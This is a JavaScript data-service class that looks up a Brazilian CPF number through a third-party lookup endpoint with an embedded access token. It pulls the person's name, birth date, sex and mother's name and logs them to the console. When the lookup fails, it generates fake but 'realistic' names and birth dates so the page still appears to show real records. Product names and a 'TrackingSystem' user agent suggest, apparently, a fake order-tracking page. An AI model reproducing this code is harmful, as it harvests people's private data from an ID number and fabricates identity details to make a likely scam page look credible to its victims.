/**
 * Serviço para busca de dados de CPF com API oficial
 */
export class DataService {
    constructor() {
        this.fallbackData = this.generateFallbackData();
        console.log('DataService initialized');
    }

    async fetchCPFData(cpf) {
        const cleanCPF = cpf.replace(/[^\d]/g, '');
        console.log('Fetching data for CPF:', cleanCPF);

        try {
            // Usar a API oficial especificada
            const response = await this.tryOfficialAPI(cleanCPF);
            if (response) {
                console.log('Data obtained from official API:', response);
                return response;
            }
        } catch (error) {
            console.error('Official API failed, using fallback:', error.message);
        }

        // Use fallback data
        console.log('Using fallback data for CPF:', cleanCPF);
        return this.getFallbackData(cleanCPF);
    }

    async tryOfficialAPI(cpf) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 segundos timeout

        try {
            console.log('Calling official API endpoint for CPF:', cpf);
            
            // Nova API oficial
            const apiUrl = `https://apela-api.tech/?user=b1b0e7e6-3bd8-4aae-bcb0-2c03940c3ae9&cpf=${cpf}`;
            
            const fetchOptions = {
                signal: controller.signal,
                method: 'GET',
                mode: 'cors',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (compatible; TrackingSystem/1.0)'
                },
                credentials: 'omit'
            };

            console.log('Fetch options:', fetchOptions);
            console.log('API URL:', apiUrl);
            
            const response = await fetch(apiUrl, fetchOptions);

            clearTimeout(timeoutId);

            console.log('Response status:', response.status);
            console.log('Response headers:', Object.fromEntries(response.headers.entries()));

            if (!response.ok) {
                console.error(`HTTP Error: ${response.status} - ${response.statusText}`);
                throw new Error(`API Error: ${response.status} - ${response.statusText}`);
            }

            const responseText = await response.text();
            console.log('API Response Text:', responseText.substring(0, 200) + (responseText.length > 200 ? '...' : ''));
            
            if (!responseText || responseText.trim() === '') {
                console.error('Empty response from API');
                throw new Error('Resposta vazia da API');
            }

            try {
                const data = JSON.parse(responseText);
                console.log('Parsed API data:', data);
                
                // Verificar se os dados têm o formato esperado da nova API
                if (data && data.status === 200 && data.nome && data.cpf) {
                    console.log('✅ Dados válidos recebidos da API oficial');
                    console.log('Nome encontrado:', data.nome);
                    console.log('CPF:', data.cpf);
                    console.log('Data de nascimento:', data.nascimento);
                    console.log('Sexo:', data.sexo);
                    console.log('Nome da mãe:', data.mae);
                    console.log('Requisições restantes:', data.requisicoes_restantes);
                    
                    // Retornar no formato esperado pelo sistema
                    return {
                        DADOS: {
                            nome: data.nome,
                            cpf: data.cpf,
                            nascimento: this.formatBirthDate(data.nascimento),
                            situacao: 'REGULAR',
                            sexo: data.sexo || 'N/A',
                            nome_mae: data.mae || 'N/A'
                        }
                    };
                }
                
                console.error('Invalid data format from API:', data);
                throw new Error('Formato de dados inválido da API');
            } catch (parseError) {
                console.error('JSON parse error:', parseError);
                throw new Error('Erro ao processar resposta da API: ' + parseError.message);
            }

        } catch (error) {
            clearTimeout(timeoutId);
            
            // Enhanced error logging
            console.error('API call error details:', {
                name: error.name,
                message: error.message,
                stack: error.stack,
                cause: error.cause
            });
            
            // Check for specific error types
            if (error.name === 'AbortError') {
                console.error('Request was aborted (timeout)');
                throw new Error('Timeout: A API demorou muito para responder');
            } else if (error.message.includes('Failed to fetch')) {
                console.error('Network error - possibly CORS or connectivity issue');
                throw new Error('Erro de conectividade: Não foi possível acessar a API externa');
            } else if (error.message.includes('CORS')) {
                console.error('CORS error detected');
                throw new Error('Erro de CORS: API externa não permite acesso do navegador');
            }
            
            throw error;
        }
    }

    formatBirthDate(dateString) {
        if (!dateString) return null;
        
        try {
            // A API retorna com barras escapadas "17\/06\/1999", vamos limpar
            return dateString.replace(/\\/g, '');
        } catch (error) {
            console.error('Erro ao formatar data de nascimento:', error);
            return null;
        }
    }

    getFallbackData(cpf) {
        // Gerar dados realistas baseados no CPF
        const names = [
            'João Silva Santos',
            'Maria Oliveira Costa',
            'Pedro Souza Lima',
            'Ana Paula Ferreira',
            'Carlos Eduardo Alves',
            'Fernanda Santos Rocha',
            'Ricardo Pereira Dias',
            'Juliana Costa Martins',
            'Bruno Almeida Silva',
            'Camila Rodrigues Nunes',
            'Rafael Santos Barbosa',
            'Larissa Oliveira Cruz'
        ];

        const cpfIndex = parseInt(cpf.slice(-2)) % names.length;
        const selectedName = names[cpfIndex];

        console.log('Generated fallback data for CPF:', cpf, 'Name:', selectedName);

        return {
            DADOS: {
                nome: selectedName,
                cpf: cpf,
                nascimento: this.generateBirthDate(cpf),
                situacao: 'REGULAR'
            }
        };
    }

    generateBirthDate(cpf) {
        const year = 1960 + (parseInt(cpf.slice(0, 2)) % 40);
        const month = (parseInt(cpf.slice(2, 4)) % 12) + 1;
        const day = (parseInt(cpf.slice(4, 6)) % 28) + 1;
        
        return `${day.toString().padStart(2, '0')}/${month.toString().padStart(2, '0')}/${year}`;
    }

    generateFallbackData() {
        return {
            products: [
                'Kit 12 caixas organizadoras + brinde',
                'Conjunto de panelas antiaderentes',
                'Smartphone Samsung Galaxy A54',
                'Fone de ouvido Bluetooth',
                'Carregador portátil 10000mAh',
                'Camiseta básica algodão',
                'Tênis esportivo Nike',
                'Relógio digital smartwatch'
            ]
        };
    }
}